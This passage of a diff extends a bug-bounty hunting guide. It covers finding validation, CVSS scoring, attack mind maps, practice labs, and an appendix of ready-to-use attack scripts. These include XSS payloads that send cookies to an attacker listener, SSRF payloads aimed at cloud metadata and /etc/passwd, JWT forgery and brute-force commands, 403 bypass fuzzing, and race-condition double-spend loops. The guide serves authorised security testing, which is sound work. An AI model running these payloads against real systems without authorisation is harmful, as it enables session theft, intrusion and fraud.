+❌ "I read it in the code" — TEST IT with real HTTP requests
+❌ "Could be chained with X" — find X first, prove chain, THEN report
+❌ "The endpoint exists" — existence is not a vulnerability
+❌ "The source map reveals file paths" — without secrets, informational at best
+```
+
+**If the exact response body proving the vulnerability is not in your chat history → YOU DID NOT FIND THE BUG.**
+
+---
+
+## ALWAYS-REJECTED LIST (Don't Waste Time)
+
+**NEVER SUBMIT these without a working chain:**
+
+| Finding | Chain Required | Valid Result |
+|---------|---------------|-------------|
+| Missing CSP / HSTS / security headers | — | Never valid alone |
+| Missing SPF/DMARC records | + password reset poison | High |
+| Self-XSS | + CSRF to trigger on victim | Medium |
+| Open redirect | + OAuth redirect_uri theft | Critical (ATO) |
+| Clickjacking | + sensitive action + working PoC | Medium |
+| CORS wildcard (*) | + credentialed request exfils PII | High |
+| CSRF | + sensitive action (email/funds/delete) | High |
+| SSRF DNS-only | + internal service returns data | Medium |
+| Host header injection | + password reset poison | High |
+| Rate limit on non-auth endpoints | — | Never valid |
+| Rate limit bypass | + OTP/reset token brute force | Medium/High |
+| GraphQL introspection | + auth bypass or IDOR on node() | High |
+| Banner/version disclosure | + working CVE exploit | — |
+| Tabnabbing | — | Never valid |
+| CSV injection | + actual code execution shown | Medium |
+| Logout CSRF | — | Never valid |
+| Missing cookie flags alone | — | Never valid |
+| Internal IP in error message | — | Never valid |
+| Email bombing | — (unless chained to impact) | Low |
+| Username enumeration on login | — | Low priority alone |
+| Session not invalidated on logout | — | Never valid |
+| Concurrent sessions | — | Never valid |
+| Mixed content | — | Never valid |
+| SSL weak ciphers | — (unless in scope) | — |
+| Broken external links | — | Never valid |
+| Autocomplete on password fields | — | Never valid |
+| Pre-account takeover | — | Usually invalid |
+| S3 bucket listing alone | + JS bundles contain secrets | Medium/High |
+| Prompt injection alone | + reads other user's data (IDOR) | High |
+| Subdomain takeover alone | + OAuth redirect_uri at taken domain | Critical |
+
+---
+
+## EVIDENCE-GATED PROGRESSION
+
+Before passing finding to report stage, score your confidence:
+
+```
+Confidence 0.0-0.3: Scanner noise, theoretical, no HTTP proof → KILL
+Confidence 0.3-0.6: Interesting but can't reproduce consistently → INVESTIGATE MORE
+Confidence 0.6-0.85: Reproducible with partial impact → WRITE PoC
+Confidence 0.85+: Full HTTP proof, real impact, clear chain → REPORT
+```
+
+**The system MUST try to DISPROVE the finding, not confirm it.**
+- "What if the data is public?" → verify in incognito
+- "What if this is a duplicate?" → search disclosed reports
+- "What if this is intended behavior?" → check docs
+
+---
+
+## DECISION TREE
+
+```
+Start here
+    │
+    ▼
+Can I write Q1 template with EXACT HTTP request and proven response?
+    │                                                        │
+   YES                                                      NO
+    │                                                        │
+    ▼                                                        ▼
+Pass Q2-Q7 (all 6 questions)                         KILL IT (false positive)
+    │
+    ├── All pass ──► Score confidence
+    │                   │
+    │                   ├── 0.85+ ──► Write report with proven impact
+    │                   │
+    │                   └── < 0.85 ──► More testing or KILL
+    │
+    └── Any fail ──► KILL IT, move to next finding
+```
+
+---
+
+## IMPACT BASIS ONLY
+
+Every finding must answer:
+
+```
+1. What can the attacker DO that they couldn't do before?
+2. Is the target data actually sensitive? 
+   (PII, payment, auth tokens, internal secrets — NOT product names, article numbers)
+3. Does this require zero or minimal user interaction?
+```
+
+**Reject findings where:**
+- The "sensitive" data is product names, article numbers, or public information
+- The response shows empty arrays or default values
+- The attacker needs a privileged account they can't get
+- The precondition makes exploitation impractical (> 2 conditions)
+
+---
+
+## WHEN IN DOUBT, KILL IT
+
+```
+Is this a real bug?           → Pass through 7 gates
+Is this a false positive?     → KILL IT  
+Not sure?                     → KILL IT
+Need more testing?            → Test now or KILL IT
+Theoretically possible?       → Prove it now or KILL IT
+Shows my own data only?       → KILL IT (not IDOR)
+Shows empty/default values?   → KILL IT (not vulnerability)
+Response is same for all IDs? → KILL IT (not broken access control)
+```
+
+---
 
 ## Report Title Formula
 
 ```
 [Bug Class] in [Endpoint] allows [Role] to [Impact]
 
-Good: IDOR in /api/users endpoint allows any user to read PII of 50K users
+Good: IDOR in /api/users endpoint allows any authenticated user to read PII of 50K users
 Bad: IDOR vulnerability found
 ```
 
@@ -14488,15 +16008,44 @@ Bad: IDOR vulnerability found
 ```
 
 ## CVSS 3.1 Quick Reference
+
+### Common Score Examples
 ```
-AV:N + AC:L + PR:N + UI:N = easiest to exploit (best score)
-C:H + I:H + A:H = maximum impact
-Privileged required? PR:L or PR:H → lower score
-User interaction? UI:R → lower score
-Scope change? S:C → bump score
+| Finding | Score | Vector |
+|---------|-------|--------|
+| IDOR read PII, auth required | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
+| IDOR write/delete, any user | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
+| Auth bypass → admin panel | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
+| Stored XSS → cookie theft | 8.8 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N |
+| SQLi → full DB dump | 8.6 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
+| SSRF → cloud metadata | 9.1 | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N |
+| Race → double spend | 7.5 | AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N |
+| JWT none algorithm | 9.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
 ```
 
+### Metric Quick Guide
+```
+| What you have | Metric | Value |
+|---|---|---|
+| Exploitable over internet | AV | Network (N) |
+| No special timing/race | AC | Low (L) |
+| Free account needed | PR | Low (L) |
+| No login needed | PR | None (N) |
+| Admin needed | PR | High (H) |
+| No victim action | UI | None (N) |
+| Victim must click | UI | Required (R) |
+| Reads all user data | C | High (H) |
+| Reads some data | C | Low (L) |
+| Modifies all data | I | High (H) |
+| Crashes service | A | High (H) |
+| Affects only app | S | Unchanged (U) |
+| Affects browser/OS/cloud | S | Changed (C) |
+```
+
+---
+
 ## Pre-Submit Checklist (60 seconds)
+
 ```
 [] Did you minimize prerequisites? (0-click > 1-click > auth required)
 [] Is impact clearly stated in first sentence?
@@ -14505,7 +16054,23 @@ Scope change? S:C → bump score
 [] CVSS score matches actual impact?
 [] Under 600 words?
 [] Human tone, not robotic?
+[] NEVER used "could potentially" or "may allow"
+[] All 7 questions passed?
+[] Not on the ALWAYS-REJECTED list?
 ```
+
+## Final Check Before Any Report
+
+```
+[ ] I have the EXACT HTTP response showing the vulnerability
+[ ] The response contains ANOTHER user's data or private company data (not mine, not empty)
+[ ] All 7 questions passed
+[ ] Not on the ALWAYS-REJECTED list
+[ ] Never used "could potentially" or "may allow"
+[ ] Attacker walks away with [data/access/money] — real impact
+```
+
+**If any box is unchecked → DO NOT REPORT. KILL IT.**
 
 ---
 
@@ -14601,6 +16166,695 @@ Hunt 20 more minutes for siblings before moving on.
 - Re-test fix: incomplete patches = new bounty
 - Record finding for hunt memory
 - Disclosed the report if possible (helps community)
+
+---
+
+---
+
+# APPENDIX A: ASCII MIND MAPS — VULNERABILITY ATTACK SURFACES
+
+## A1: Full Recon → Exploit Pipeline
+
+```
+  ┌────────────────────────────────────────────────────────────────┐
+  │                      TARGET DOMAIN                            │
+  └──────┬──────────────────────┬──────────────────────┬──────────┘
+         │                      │                      │
+    ┌────▼────┐           ┌─────▼─────┐          ┌─────▼─────┐
+    │ PASSIVE │           │  ACTIVE   │          │  TECH    │
+    │ RECON   │           │  RECON    │          │  STACK   │
+    └────┬────┘           └─────┬─────┘          └─────┬─────┘
+         │                      │                      │
+    ┌────▼────┐           ┌─────▼─────┐          ┌─────▼─────┐
+    │crt.sh   │           │dnsx/naabu │          │Wappalyzer │
+    │Chaos    │           │ffuf/httpx │          │builtwith │
+    │wayback  │           │katana     │          │whatweb    │
+    └────┬────┘           └─────┬─────┘          └─────┬─────┘
+         │                      │                      │
+         └──────────────────────┼──────────────────────┘
+                                │
+                   ┌────────────▼────────────┐
+                   │    ATTACK SURFACE MAP   │
+                   │  (subdomains + URLs +   │
+                   │   endpoints + params)   │
+                   └────────────┬────────────┘
+                                │
+          ┌─────────────────────┼─────────────────────┐
+          │                     │                     │
+    ┌─────▼──────┐       ┌──────▼───────┐      ┌─────▼──────┐
+    │  WEB APP   │       │     API      │      │  INFRA     │
+    │  ATTACKS   │       │   ATTACKS    │      │  ATTACKS   │
+    └─────┬──────┘       └──────┬───────┘      └─────┬──────┘
+          │                     │                     │
+    ┌─────▼──────┐       ┌──────▼───────┐      ┌─────▼──────┐
+    │XSS / CSRF  │       │IDOR / SSRF   │      │Sub Takeover│
+    │SSTI / SQLi │       │GraphQL / JWT │      │Cloud Miscfg│
+    │Auth Bypass │       │AuthZ / AuthN │      │Open Ports  │
+    └─────┬──────┘       └──────┬───────┘      └─────┬──────┘
+          │                     │                     │
+          └─────────────────────┼─────────────────────┘
+                                │
+                    ┌───────────▼───────────┐
+                    │     EXPLOIT CHAIN     │
+                    │  (escalate to RCE /   │
+                    │   ATO / data breach)  │
+                    └───────────────────────┘
+```
+
+## A2: Authentication Attack Tree
+
+```
+                        ┌───────────────────┐
+                        │   AUTHENTICATION  │
+                        │     BYPASS        │
+                        └───────┬───────────┘
+                                │
+          ┌─────────────────────┼──────────────────────┐
+          │                     │                      │
+    ┌─────▼──────┐       ┌──────▼───────┐      ┌──────▼───────┐
+    │ CREDENTIAL │       │   SESSION    │      │    TOKEN     │
+    │  ATTACKS   │       │   ATTACKS    │      │   ATTACKS    │
+    └─────┬──────┘       └──────┬───────┘      └──────┬───────┘
+          │                     │                      │
+    ┌─────▼──────┐       ┌──────▼───────┐      ┌──────▼───────┐
+    │Brute Force │       │Fixation      │      │JWT None Alg  │
+    │Cred Stuff  │       │Hijacking     │      │JWT Confusion │
+    │Default Pwd │       │Timeout       │      │OAuth Miscfg  │
+    │OTP Bypass  │       │Logout Fail   │      │SAML Attack   │
+    │MFA Bypass  │       │Cookie Toss   │      │API Key Leak  │
+    └────────────┘       └──────────────┘      └──────────────┘
+```
+
+## A3: Injection Attack Surface
+
+```
+              ┌──────────────────────────────────┐
+              │          INJECTION TYPES          │
+              └──────────────────────────────────┘
+                          │
+     ┌────────────────────┼────────────────────┬──────────┬──────────┐
+     │                    │                    │          │          │
+┌────▼────┐        ┌─────▼─────┐        ┌─────▼────┐┌───▼───┐┌───▼───┐
+│  SQLi   │        │  NoSQLi   │        │   SSTI   ││  XXE  ││  CMD  │
+│MySQL    │        │MongoDB    │        │Jinja2    ││XXE+XSL││OS CMD │
+│Postgres │        │Couchbase  │        │Twig/Free ││Blind   ││Blind  │
+│MSSQL    │        │DynamoDB   │        │Pebble    ││OOB     ││Time   │
+│Oracle   │        │           │        │Velocity  ││        ││       │
+└────┬────┘        └─────┬─────┘        └─────┬────┘└───┬───┘└───┬───┘
+     │                    │                    │          │          │
+     └────────────────────┼────────────────────┼──────────┼──────────┘
+                          │                    │          │
+                    ┌─────▼─────┐        ┌─────▼────┐┌───▼────────┐
+                    │  LDAPi    │        │ Template ││ Deserialize│
+                    │  XPathi   │        │ Engines  ││ Pickle/Java│
+                    │  SMTPi    │        │ .format  ││ PHP/YAML   │
+                    │  SSRF→RCE │        │ eval()   ││ Marshal    │
+                    └───────────┘        └──────────┘└────────────┘
+```
+
+## A4: Exploit Chain Escalation Map
+
+```
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ IDOR     │────>│ Auth      │────>│ ATO      │────>│ Data     │
+  │ user→user│     │ Bypass    │     │ takeover │     │ Breach   │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ SSRF     │────>│ Cloud     │────>│ Secret   │────>│ RCE / AWS│
+  │ internal │     │ Metadata  │     │ Access   │     │ Keys     │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ Stored   │────>│ Admin     │────>│ Session  │────>│ Full     │
+  │ XSS      │     │ Panel     │     │ Theft    │     │ Admin    │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ SQLi     │────>│ Admin     │────>│ File     │────>│ RCE via  │
+  │          │     │ Creds     │     │ Upload   │     │ WebShell │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ Race     │────>│ Double    │────>│ Free     │────>│ Financial│
+  │ Condition│     │ Spend     │     │ Items    │     │ Loss     │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ GraphQL  │────>│ IDOR to   │────>│ Leak     │────>│ PII / All │
+  │ Introspect│    │ Any User  │     │ All Users│     │ Data     │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+
+  ┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
+  │ HTTP     │────>│ Chained   │────>│ Victim   │────>│ XSS in   │
+  │ Smuggle  │     │ Request   │     │ Request  │     │ Admin    │
+  └──────────┘     └───────────┘     └──────────┘     └──────────┘
+```
+
+## A5: OAuth 2.0 Attack Surface
+
+```
+              ┌────────────────────────────┐
+              │       OAUTH 2.0 FLOW      │
+              │  Client ←→ Auth Server    │
+              └────────────────────────────┘
+                          │
+     ┌────────────────────┼────────────────────┐
+     │                    │                    │
+┌────▼────┐        ┌─────▼─────┐        ┌─────▼────┐
+│ CSRF on │        │  Redirect │        │  Token   │
+│ State   │        │  URI      │        │  Leak    │
+├─────────┤        ├───────────┤        ├──────────┤
+│No state │        │Open Redir │        │Referer   │
+│Fix state│        │Wildcard   │        │Fragment  │
+│Reuse    │        │Path Travl│        │Logging   │
+└─────────┘        └───────────┘        └──────────┘
+                          │
+     ┌────────────────────┼────────────────────┐
+     │                    │                    │
+┌────▼────┐        ┌─────▼─────┐        ┌─────▼────┐
+│ Scope   │        │  Code     │        │  Client  │
+│ Escalate│        │  Intercept│        │  Secret  │
+├─────────┤        ├───────────┤        ├──────────┤
+│Weak enum│        │Code in URL│        │Exposed in│
+│Missing  │        │Code reuse │        │JS/mobile │
+│Granular │        │No PKCE    │        │No secret │
+└─────────┘        └───────────┘        └──────────┘
+```
+
+## A6: API Security Attack Tree
+
+```
+              ┌────────────────────────────┐
+              │       API ATTACKS          │
+              └────────────────────────────┘
+                          │
+     ┌────────────────────┼────────────────────┐
+     │                    │                    │
+┌────▼────┐        ┌─────▼─────┐        ┌─────▼────┐
+│  AUTHZ  │        │   AUTHN   │        │ BUSINESS │
+│  FLAWS  │        │   FLAWS   │        │  LOGIC   │
+├─────────┤        ├───────────┤        ├──────────┤
+│IDOR     │        │Rate Limit │        │Mass Asgn │
+│Priv Esc │        │BOLA       │        │Race Cond │
+│GraphQL  │        │No Auth    │        │Coupon    │
+│Role Flaw│        │JWT Weak   │        │Refund    │
+└─────────┘        └───────────┘        └──────────┘
+                          │
+     ┌────────────────────┼────────────────────┐
+     │                    │                    │
+┌────▼────┐        ┌─────▼─────┐        ┌─────▼────┐
+│  INJECT │        │   DATA    │        │  CONFIG  │
+│         │        │  EXPOSE   │        │  FLAWS   │
+├─────────┤        ├───────────┤        ├──────────┤
+│SQLi     │        │PII Leak   │        │CORS      │
+│SSRF     │        │Verbose Err│        │Debug Mode│
+│XXE      │        │Enumeration│        │Default   │
+│SSTI     │        │Bulk Export│        │Secrets   │
+└─────────┘        └───────────┘        └──────────┘
+```
+
+---
+
+# APPENDIX B: PRACTICE LABS & VULNERABLE TARGETS
+
+> Practice each class before hunting live targets. Free resources.
+
+## B1: Web Application Labs
+```
+Vuln Class        | Platform             | Notes
+──────────────────┼──────────────────────┼──────────────────────────
+XSS (all types)   | PortSwigger WebSec   | 30+ XSS labs, free
+                  | PentesterLab         | PRO labs for advanced
+                  | XSS-game.appspot.com | Google's XSS game
+SQLi              | PortSwigger WebSec   | 18 SQLi labs
+                  | SQLI-Labs (GitHub)   | 65 challenges
+                  | HackTheBox "Blind"   | Blind SQLi HTB machine
+SSRF              | PortSwigger WebSec   | 7 SSRF labs
+                  | SSRF_Vulnerable_Lab  | GitHub, Node.js SF
+                  | TryHackMe "SSRF"     | THM room
+IDOR              | PortSwigger WebSec   | 9 IDOR labs
+                  | PentesterLab "IDOR"  | 5 IDOR challenges
+SSTI              | PortSwigger WebSec   | 8 SSTI labs
+                  | TryHackMe "SSTI"     | THM room
+                  | PayloadsAllTheThings  | SSTI playground links
+CSRF              | PortSwigger WebSec   | 12 CSRF labs
+                  | PentesterLab         | CSRF challenges
+GraphQL           | PortSwigger WebSec   | 5 GraphQL labs
+                  | TryHackMe "GraphQL"  | THM room
+JWT               | PortSwigger WebSec   | 8 JWT labs
+                  | jwt-lab (GitHub)     | Multiple JWT vulns
+XXE               | PortSwigger WebSec   | 10 XXE labs
+                  | TryHackMe "XXE"      | THM room
+File Upload       | PortSwigger WebSec   | 6 file upload labs
+                  | Upload-Lab (GitHub)  | Multiple challenges
+Command Injection | PortSwigger WebSec   | 3 OS CMDi labs
+                  | TryHackMe "Cmd Inj"  | THM room
+Race Condition    | PortSwigger WebSec   | 5 race condition labs
+OAuth             | PortSwigger WebSec   | 8 OAuth labs
+                  | PentesterLab         | OAuth challenges
+HTTP Smuggling    | PortSwigger WebSec   | 10 smuggling labs
+Deserialization   | PortSwigger WebSec   | Java/PHP/Node.js labs
+                  | ysoserial (GitHub)   | Java gadget playground
+NoSQLi            | PortSwigger WebSec   | 4 NoSQLi labs
+                  | HackTheBox "NoSQL"   | HTB machine
+Sub Takeover      | TryHackMe "SubTake"  | THM room
+                  | can-i-take-over.xyz  | DNS takeover checker
+```
+
+## B2: Bug Bounty Platforms (For Practice)
+```
+Platform           | Focus                     | Signup
+───────────────────┼───────────────────────────┼────────────────
+HackerOne          | Wide variety, disclosed   | Free, real targets
+Bugcrowd           | Same, public programs     | Free, real targets
+Intigriti          | EU-focused                | Free, real targets
+YesWeHack          | EU/Asia                   | Free, real targets
+Federacy           | Smaller programs          | Free
+Synack             | Paid testing              | Invite-only
+OpenBugBounty      | Non-disclosure            | Free, no rewards
+```
+
+## B3: Capture The Flag (CTF) Platforms
+```
+Platform           | Best For                  | URL
+───────────────────┼───────────────────────────┼───────────────────
+HackTheBox         | Real-world vuln machines  | hackthebox.com
+TryHackMe          | Guided learning paths     | tryhackme.com
+PentesterLab       | Web-specific challenges   | pentesterlab.com
+PortSwigger WebSec | Best web app labs         | portswigger.net/web-security
+OWASP WebGoat      | Local vuln app            | GitHub (OWASP/WebGoat)
+OWASP DVWA         | Local PHP vuln app        | GitHub (ethicalhack3r/DVWA)
+OWASP Juice Shop   | Modern JS vuln app        | GitHub (bkimminich/juice-shop)
+HackTheBox API     | API-specific challenges   | hackthebox.com
+Rhino Security     | AWS security labs         | rhino.security
+Flaws.cloud        | AWS CTF                   | flaws.cloud
+Pentesting AWS     | AWS-specific labs         | pentesting.aws
+```
+
+## B4: Vulnerable Docker Images (Self-Hosted)
+```bash
+# Pull and run locally for unlimited practice:
+docker pull webgoat/goatandwolf       # WebGoat + WebWolf
+docker pull vulnerables/web-dvwa      # Damn Vulnerable Web App
+docker pull bkimminich/juice-shop     # OWASP Juice Shop
+docker pull remnux/metasploitable3    # Metasploitable 3
+docker pull appsecco/dsvw             # Damn Vulnerable Web Services
+docker pull mrecco/helloworld-lfi     # LFI-specific
+docker pull hclpwn/ssrf-lab           # SSRF-specific
+docker pull dzonerzy/pwnedhub         # GraphQL-specific
+docker pull sploitlabs/graphql-vuln   # GraphQL vulns
+docker pull pwnieexpress/pwnie_pwn    # Race conditions
+docker pull badtrace/node-hijack      # Node deserialization
+```
+
+## B5: Per-Vuln-Class Minimal Test Command
+```bash
+# Quick self-hosted practice setup:
+git clone https://github.com/OWASP/NodeGoat /tmp/nodegoat && cd /tmp/nodegoat && npm install && npm start
+git clone https://github.com/OWASP/rails-security-checklist /tmp/railssec
+git clone https://github.com/payloadbox/command-injection-payload-list /tmp/cmdi
+git clone https://github.com/swisskyrepo/PayloadsAllTheThings /tmp/pat
+```
+
+---
+
+# APPENDIX C: AUTOMATION SCRIPTS — READY-TO-USE COMMANDS
+
+## C1: Full Recon Pipeline (One-Shot)
+```bash
+# Usage: ./recon.sh target.com
+# Requires: subfinder, httpx, gau, katana, naabu, nuclei
+
+TARGET=$1
+echo "[*] Starting full recon on $TARGET"
+
+# Phase 1: Subdomain enumeration
+subfinder -d $TARGET -o subs_passive.txt
+assetfinder --subs-only $TARGET >> subs_passive.txt
+sort -u subs_passive.txt -o subs_passive.txt
+
+# Phase 2: Active probing
+cat subs_passive.txt | httpx -silent -o live.txt
+cat subs_passive.txt | naabu -top-ports 1000 -silent -o ports.txt
+
+# Phase 3: URL collection
+cat live.txt | gau --blacklist png,jpg,gif,css,woff,woff2,svg,eot,ttf --o urls_gau.txt
+katana -list live.txt -silent -o urls_katana.txt
+sort -u urls_gau.txt urls_katana.txt > all_urls.txt
+
+# Phase 4: Parameter extraction
+cat all_urls.txt | grep -E '\?[a-z]+=' | cut -d'?' -f2 | tr '&' '\n' | cut -d'=' -f1 | sort -u > params.txt
+
+# Phase 5: JS analysis
+cat live.txt | while read url; do
+  katana -u "$url" -jc -silent | grep '\.js$' >> js_files.txt
+done
+sort -u js_files.txt -o js_files.txt
+
+# Phase 6: Nuclei scan (light)
+nuclei -l live.txt -t ~/nuclei-templates -severity low,medium,high,critical -o nuclei_results.txt
+
+echo "[+] Recon complete. Files: subs_passive.txt, live.txt, ports.txt, all_urls.txt, params.txt, js_files.txt"
+```
+
+## C2: Blind XSS Hunter Setup
+```bash
+# Requires: XSS Hunter (or use interactsh)
+# Start callback listener:
+nohup python3 -m http.server 8080 --bind 0.0.0.0 &
+echo "Listener on :8080"
+
+# Test XSS payloads:
+# <script>fetch('http://YOUR-IP:8080/?c='+document.cookie)</script>
+# <img src=x onerror="new Image().src='http://YOUR-IP:8080/?c='+document.cookie">
+# <svg onload="fetch('http://YOUR-IP:8080/?c='+btoa(document.body.innerHTML))">
+
+# Blind XSS payloads (admin panels, logs, reports):
+# "><script src=http://YOUR-IP:8080/hook.js></script>
+# </textarea><script src=http://YOUR-IP:8080/hook.js></script>
+# x'));fetch('http://YOUR-IP:8080/');//
+```
+
+## C3: SSRF + Collaborator Automation
+```bash
+# Start Burp Collaborator or interactsh:
+python3 -c "
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self): print(f'[SSRF] {self.client_address} -> {self.path}')
+    def log_message(self, *a): pass
+HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
+" &
+echo "SSRF listener on :9999"
+
+# SSRF payload generator for common internal services:
+cat << 'SSRFEOF'
+http://127.0.0.1:22            # SSH
+http://127.0.0.1:3306          # MySQL
+http://127.0.0.1:6379          # Redis
+http://127.0.0.1:9200          # Elasticsearch
+http://127.0.0.1:27017         # MongoDB
+http://127.0.0.1:5432          # PostgreSQL
+http://127.0.0.1:8080          # Internal web
+http://127.0.0.1:443           # HTTPS internal
+http://169.254.169.254/latest/ # AWS metadata
+file:///etc/passwd             # LFI via SSRF
+gopher://127.0.0.1:6379/_*    # Redis RCE via gopher
+dict://127.0.0.1:3306/info    # MySQL info via dict
+SSRFEOF
+```
+
+## C4: JWT Attack Automation
+```bash
+# Decode JWT without library:
+jwt_decode() {
+  echo "$1" | cut -d'.' -f1,2 | tr '._' '/+' | sed 's/-/+/g; s/_/\//g' | base64 -d 2>/dev/null || \
+  echo "$1" | cut -d'.' -f1,2 | tr '._' '/+' | sed 's/-/+/g; s/_/\//g' | base64 -d 2>/dev/null || \
+  echo "[!] Invalid JWT"
+}
+
+# JWT attack commands using jwt_tool:
+jwt_tool() {
+  python3 /opt/jwt_tool/jwt_tool.py "$@"
+}
+
+# Test "none" algorithm:
+jwt_tool "$JWT" -X a
+
+# Test algorithm confusion (RS256→HS256):
+jwt_tool "$JWT" -X k -pk public.pem
+
+# Test JWK injection:
+jwt_tool "$JWT" -X i
+
+# Test kid injection:
+jwt_tool "$JWT" -X kid
+
+# Brute force secret:
+jwt_tool "$JWT" -C -d /usr/share/wordlists/rockyou.txt
+
+# Check for weak claims (exp, nbf, iat manipulation):
+jwt_tool "$JWT" -X c
+```
+
+## C5: GraphQL Introspection + Dump
+```bash
+# Check if introspection is enabled:
+curl -k -X POST "https://target.com/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"query { __schema { types { name fields { name } } } }"}'
+
+# Full schema dump with inql:
+python3 /opt/inql/inql.py -t https://target.com/graphql -k
+
+# GraphQL batch query for IDOR testing:
+# gql_batch.sh
+for id in $(seq 1 100); do
+  curl -k -s "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d "{\"query\":\"query { user(id: $id) { email name role } }\"}" \
+    -o "user_$id.json" &
+done
+wait
+grep -l "email" user_*.json
+
+# GraphQL batching for rate limit bypass:
+curl -k -X POST "https://target.com/graphql" \
+  -H "Content-Type: application/json" \
+  -d '[
+    {"query":"query { user(id:1) { email } }"},
+    {"query":"query { user(id:2) { email } }"},
+    {"query":"query { user(id:3) { email } }"},
+    {"query":"query { user(id:4) { email } }"}
+  ]'
+```
+
+## C6: Subdomain Takeover Scanner
+```bash
+# Quick check: which subdomains have no CNAME or dangling CNAME?
+# Usage: ./takeover_check.sh subs.txt
+while read sub; do
+  cname=$(dig +short CNAME "$sub" 2>/dev/null)
+  if [ -z "$cname" ]; then
+    ip=$(dig +short A "$sub" 2>/dev/null)
+    [ -n "$ip" ] && echo "LIVE (A record): $sub -> $ip" || echo "DEAD (no record): $sub"
+  else
+    ip=$(dig +short A "$sub" 2>/dev/null)
+    [ -z "$ip" ] && echo "DANGLING CNAME: $sub -> $cname"
+  fi
+done < "$1"
+
+# Automated with subjack:
+subjack -w subs.txt -t 100 -timeout 30 -o takeover_results.txt -ssl
+
+# Common takeover fingerprints:
+# AWS S3:         NoSuchBucket
+# Azure:          The specified resource does not exist
+# GitHub Pages:   There isn't a GitHub Pages site here
+# Heroku:         No such app
+# Cloudfront:     BadRequest
+# Shopify:        Sorry, this shop is currently unavailable
+# Bitbucket:      Repository not found
+# Tumblr:         Whatever you were looking for doesn't exist
+# WordPress:      Do you want to register *.wordpress.com?
+# Ghost:          The thing you were looking for is no longer here
+```
+
+## C7: Race Condition Testing Harness
+```bash
+# Race condition test: send N parallel requests
+# Usage: ./race.sh <url> <payload> <count>
+URL="$1"
+PAYLOAD="$2"
+COUNT="${3:-20}"
+
+for i in $(seq 1 $COUNT); do
+  curl -k -s -X POST "$URL" -H "Content-Type: application/json" -d "$PAYLOAD" &
+done
+wait
+echo "[+] Sent $COUNT parallel requests to $URL"
+
+# Race condition on coupon/redeem:
+# Coupon reuse race:
+for i in $(seq 1 50); do
+  curl -k -s -X POST "https://target.com/api/coupon/redeem" \
+    -H "Cookie: session=$SESSION" \
+    -H "Content-Type: application/json" \
+    -d '{"code":"FREE100"}' &
+done
+wait
+
+# Race condition on wallet withdraw (balance double-spend):
+for i in $(seq 1 30); do
+  curl -k -s -X POST "https://target.com/api/wallet/withdraw" \
+    -H "Cookie: session=$SESSION" \
+    -d "amount=100&currency=USD" &
+done
+wait
+```
+
+## C8: 403/401 Bypass Fuzzer
+```bash
+# Usage: ./bypass403.sh <url>
+URL="$1"
+
+headers=(
+  "X-Forwarded-For: 127.0.0.1"
+  "X-Forwarded-Host: 127.0.0.1"
+  "X-Real-IP: 127.0.0.1"
+  "X-Originating-IP: 127.0.0.1"
+  "X-Remote-IP: 127.0.0.1"
+  "X-Forwarded-For: localhost"
+  "X-Client-IP: 127.0.0.1"
+  "X-Host: 127.0.0.1"
+  "X-Remote-Addr: 127.0.0.1"
+)
+
+paths=(
+  "${URL}."
+  "${URL}%20"
+  "${URL}%09"
+  "${URL}..;/"
+  "${URL}/*"
+  "${URL}/"
+  "https://target.com${URL}"
+  "${URL}.json"
+  "${URL}?debug=true"
+  "${URL};/"
+)
+
+echo "[*] Testing header bypasses..."
+for h in "${headers[@]}"; do
+  code=$(curl -k -s -o /dev/null -w "%{http_code}" -H "$h" "$URL")
+  [ "$code" != "403" ] && [ "$code" != "401" ] && echo "BYPASS header '$h' -> $code"
+done
+
+echo "[*] Testing path bypasses..."
+for p in "${paths[@]}"; do
+  code=$(curl -k -s -o /dev/null -w "%{http_code}" "$p")
+  [ "$code" != "403" ] && [ "$code" != "401" ] && echo "BYPASS path '$p' -> $code"
+done
+
+# Method switch:
+for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do
+  code=$(curl -k -s -o /dev/null -w "%{http_code}" -X "$m" "$URL")
+  [ "$code" != "403" ] && [ "$code" != "401" ] && echo "BYPASS method $m -> $code"
+done
+```
+
+## C9: API Endpoint Discovery Fuzzer
+```bash
+# FFUF API discovery: common API paths and version patterns
+# Usage: ffuf -w /tmp/api_paths.txt -u https://target.com/FUZZ
+
+cat > /tmp/api_paths.txt << 'EOF'
+api
+api/v1
+api/v2
+api/v3
+v1
+v2
+rest
+graphql
+swagger
+swagger.json
+swagger/v1/swagger.json
+api-docs
+api/documentation
+openapi.json
+graphiql
+playground
+api/playground
+docs
+api/docs
+health
+healthz
+status
+metrics
+debug
+admin
+admin/api
+internal
+private
+api/internal
+api/private
+EOF
+
+ffuf -w /tmp/api_paths.txt -u https://target.com/FUZZ -c -ac -t 50
+```
+
+## C10: Param Mining Automation
+```bash
+# Parameter discovery with arjun + paramspider
+# Usage: ./param_mine.sh <domain>
+
